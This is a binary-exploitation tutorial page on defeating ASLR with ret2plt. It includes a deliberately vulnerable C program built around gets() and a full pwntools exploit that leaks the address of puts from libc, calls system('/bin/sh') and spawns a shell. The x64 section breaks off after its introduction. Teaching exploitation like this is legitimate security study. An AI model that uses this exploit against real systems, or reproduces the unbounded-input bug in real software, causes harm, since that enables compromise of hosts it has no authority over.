---
description: 09/20/2023
---

# â˜  Bypassing Address Space Layout Randomization (ret2plt)

This will feature x86 and x64-based exploitation.

## Introduction

**Need a refresher on ASLR?**

{% content-ref url="memory-protections/address-space-layout-randomization-aslr.md" %}
[address-space-layout-randomization-aslr.md](memory-protections/address-space-layout-randomization-aslr.md)
{% endcontent-ref %}

<mark style="color:yellow;">Address Space Layout Randomization</mark>, or <mark style="color:yellow;">ASLR</mark> is very similar to PIE.&#x20;

However, it is <mark style="color:yellow;">implemented at the kernel level of the underlying operating system</mark>.

<mark style="color:yellow;">The base address of the string and the functions are going to be randomized with each execution of the binary</mark>.

With <mark style="color:green;">ASLR enabled</mark>, you can visualize this by running `ldd` against your target binary a few times:

<figure><img src="../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

### How Does ret2plt Work?

Here, we will be taking advantage of the <mark style="color:yellow;">**ret2plt**</mark> technique that <mark style="color:yellow;">involves calling</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`puts@plt`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">and passing the GOT entry of</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`puts()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">as a parameter</mark>.

This will cause <mark style="color:yellow;">`puts()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">to print out its own address in</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`libc`</mark>.

* How cool is that?!

This will allow us to leak the ASLR base. Essentially, we need to craft a payload that leaks the real address of `puts()`.&#x20;

As we learned in [overwriting-global-offset-table-got.md](overwriting-global-offset-table-got.md "mention"), <mark style="color:yellow;">we know that calling the PLT entry of the function is the same as calling the function itself</mark>. If we point the parameter to the GOT entry, it will print out it's location/address.

This is because C string arguments for functions take pointers of where the string can be found.

Ultimately, pointing it to the GOT entry will print it out.

### References

{% embed url="https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass" %}

{% embed url="https://sharkmoos.medium.com/binary-exploitation-exploiting-ret2libc-328eefb0421b" %}

## Exploitation (x86)

### Source Code

`vuln-32.c`:

```c
#include <stdio.h>

void vuln() {
    puts("Come get me");

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
```

### Exploit Code

Note: <mark style="color:yellow;">be sure to read the comments embedded in the exploit code to further understand how the exploit is behaving</mark>.

`exploit.py`:

```python
from pwn import *

# Basic pwn template setup
elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

# We need a payload that will leak the actual address of puts()
# Remember, calling the PLT entry of the function is the same as calling the function itself
p.recvline()    # Receive the first output

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],    # Main??? This is acting as the return address. However, if we set it to something random, it will leak the libc base and crash but if we were to call main() again, we would simply restart the binary.
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))  # The GOT entry will not be the only thing printed. puts() will be. It will be printed as a null-byte. This means it will keep on printing GOT addresses, but we only care about the first one. So, we will grab the first 4 bytes and utilize u32() to interpret them as a little-endian number.
p.recvlines(2) # This means we will ignore the rest of the values as well as the puts() output from calling main() again.

# Next, we will calculate the libc base and perform a ret2libc attack
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC Base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'], # Call system() from libc
    libc.sym['exit'], # Call exit() from libc to exit gracefully. exit() is not required here, it's just nicer
    next(libc.search(b'/bin/sh\x00')) # Search for the string "/bin/sh" in libc and append it as an argument to system() found in libc.
)

p.sendline(payload) # Send payload
p.interactive() # Obtain interactive shell
```

## Exploitation (x64)

Here, we can utilize a similar methodology, however since we are working with x64, we will need to utilize ROP gadgets to inject our data into the registers.
